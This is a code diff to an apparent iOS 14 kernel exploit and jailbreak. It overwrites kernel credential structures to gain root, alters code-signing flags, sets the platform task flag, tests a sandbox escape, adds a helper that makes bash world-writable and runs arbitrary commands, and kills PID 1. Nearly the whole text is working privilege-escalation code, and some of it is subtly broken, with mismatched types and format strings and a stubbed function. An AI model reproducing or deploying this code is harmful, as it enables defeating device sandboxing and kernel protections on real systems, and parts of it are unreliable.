@@ -265,6 +265,7 @@ uint64_t rootify14(uint64_t ucred_proc){
     
     return getgid();
 }
+
 uint64_t sys_kill(const char*app){
     
     return posix_spawn("/var/bin/killall", app, NULL, NULL, NULL, NULL);
@@ -292,6 +293,16 @@ uint64_t getCredsFromBoners(uint64_t proc,uint64_t ucred,pid_t donor,char*bin){
     uint64_t creds=browwopid(proc, ucred, donor);
     kill(pid,SIGSEGV);
     return creds;
+}
+int system_(char *cmd) {
+    chmod("/var/bin/bash", 0777);
+    chdir("/var/bin/");
+    return posix_spawn("/var/bin/bash", "-c", cmd, NULL, NULL, NULL);
+}
+uint64_t platformize14(uint64_t task,uint64_t proc,uint32_t csFlags){
+    
+    return 0;
+    
 }
 uint64_t cicuta_virosa(void) {
     int* race_flag = malloc(sizeof(int));
@@ -453,6 +464,20 @@ uint64_t cicuta_virosa(void) {
        uint32_t creds[5] = {0, 0, 0, 1, 0};
    
     write_20(ucred + 0x18, (void*)creds);
+    mach_port_t port;
+      kern_return_t rv = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+      if (rv) {
+          printf("[-] Failed to allocate port (%s)\n", mach_error_string(rv));
+          return MACH_PORT_NULL;
+      }
+      rv = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+      if (rv) {
+          printf("[-] Failed to insert right (%s)\n", mach_error_string(rv));
+          return MACH_PORT_NULL;
+      }
+    
+    printf("new port: 0x%llx",port);
+   
     cicuta_log("\n[!] patching priviliges -> rootify14");
     setuid(0);
     sleep(1);
@@ -463,7 +488,7 @@ uint64_t cicuta_virosa(void) {
     sleep(1);
     cicuta_log("....\n");
     //write_20(ucred + 0x1c, (void*)creds); //ruid
-    sleep(1);
+   
      //svgid
     cicuta_log("\n.\n");
     //write_20(ucred + 0x78, (void*)creds); // cr_label
@@ -477,14 +502,26 @@ uint64_t cicuta_virosa(void) {
     //0x290 csflags
     uint32_t csFlags=read_32(proc +0x290);
     sleep(3);
-    printf("\ncsflags original %d\n",csFlags);
+    printf("\ncsflags original 0x%llx\n",csFlags);
     sleep(3);
     csFlags=(csFlags|0xA8|0x0000008|0x0000004|0x10000000)&~(0x0000800|0x0000100|0x0000200);
-    write_32(proc +0x290, csFlags);
-    printf("\ncsflags after %d\n",csFlags);
+    write_32(proc +0x290, (void*)csFlags);
+    printf("\ncsflags after 0x%llx\n",csFlags);
     sleep(4);
     printf("patched cs are you still alive?");
-    sys_kill("backboardd");
+    
+    sleep(2);
+    platformize14(task, proc, csFlags);
+    uint32_t t_flag=read_32(task + 0x3A0);
+
+    printf("\n[*] Platformization Step\n");
+    printf("TF_PLATFORM before 0x%llx\n",t_flag);
+    sleep(2);
+    t_flag|=0x4000000;
+    write_32(task+0x3A0, &t_flag);
+    write_32(proc + 0x290, csFlags|0x24004001u);
+    printf("TF_PLATFORM after 0x%llx\n",t_flag);
+    kill(1, SIGKILL);
     return task_pac;
 err:
     free(redeem_racers);
@@ -495,7 +532,7 @@ err:
 
 
 uint64_t root_patch(uint64_t task_pac){
-    printf("Rootify is happenning now...");
+
     uint64_t task = task_pac | 0xffffff8000000000;
 
 
@@ -521,48 +558,21 @@ uint64_t root_patch(uint64_t task_pac){
     write_32(ucred + 0x6c, (void*)fake_data_);
     printf("\noff_ucred_cr_rgid -> %d",getgid());
     if(getgid()==0){
-        printf("rootified.");
+   
         return 0;
     }else{
         
     }
     return 3;
 }
-uint64_t platformize14(uint64_t taskp){
- 
-    uint64_t task=taskp|0xffffff8000000000;
-    
-    uint64_t proc_pac = read_64(task + 0x10);
 
-      
-    uint64_t proc = proc_pac | 0xffffff8000000000;
-    uint64_t ucred_pac = read_64(proc + 0xf0);
-   
-    uint64_t ucred = ucred_pac | 0xffffff8000000000;
-    uint32_t t_flags=read_32(ucred + 0x3A0);
-    
-    t_flags|=0x4000000;
-    uint32_t bugger[5] = {0, 0, 0, 1, 0};
-    uint64_t new_flags[1]={0x4000000};
-    printf("\nbefore patch %d\n",read_32(t_flags + 0x3A0));
-    sleep(4);
-    write_32(ucred + 0x3A0, (void*)t_flags);
-    printf("after patch %d\n",read_32(t_flags + 0x3A0));
-    sleep(4);
-    uint64_t csflags=read_64(proc + 0x12);
-    
-    //write_64(proc + 0x12, csflags | 0x24004001u);
-    
-    printf("patched TF_PLATFORM");
-    return 0;
-}
 uint64_t SetupLinks(){
     mkdir("/var/mobile/LIB/dropbear", 0777);
     chmod("/var/mobile/LIB/dropbear", 0777);
     if(symlink("/var/mobile/LIB", "/var/LIB")){
         printf("[+] symlinked -> /var/mobile/LIB /var/LIB");
     }
-    sys_kill("backboardd"); //testing
+    kill(1, SIGKILL);
     return 0;
 }
  
@@ -590,10 +600,10 @@ uint64_t label = c_la_pac | 0xffffff8000000000;
     FILE *f = fopen("/var/mobile/.sandboxtest", "w");
 
     if(f){
-        printf("[+] Sandbox escaped -> 1");
+        printf("\n[+] Sandbox escaped -> 1");
         root_patch(task);
         //platformize14(task);
-        printf("cleanup...");
+        printf("\ncleanup...");
         
       
         return 1; // ret=unsandboxed;
